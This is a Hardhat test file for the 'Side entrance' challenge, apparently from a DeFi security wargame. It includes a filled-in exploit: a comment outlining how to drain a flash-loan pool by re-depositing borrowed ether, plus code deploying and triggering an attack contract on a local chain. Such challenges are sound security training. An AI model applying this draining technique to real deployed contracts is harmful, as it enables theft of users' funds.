const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        [deployer, attacker] = await ethers.getSigners();
        console.log(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
        // Attacker starts with 10000 ETH

        // Attack flow: flashloan for entire pool amt (1000), implement execute on IFlashLoanEtherReceiver to deposit the borrowed amount (1000)
        // Require check will pass, then withdraw 1000 from balances

        const AttackFactory = await ethers.getContractFactory('AttackSideEntrance', attacker);
        this.attackFactory = await AttackFactory.deploy(this.pool.address);

        await this.attackFactory.connect(attacker).attack();

        console.log("Attacker balance: ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
        console.log("Pool balance: ", ethers.utils.formatEther(await ethers.provider.getBalance(this.pool.address)));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
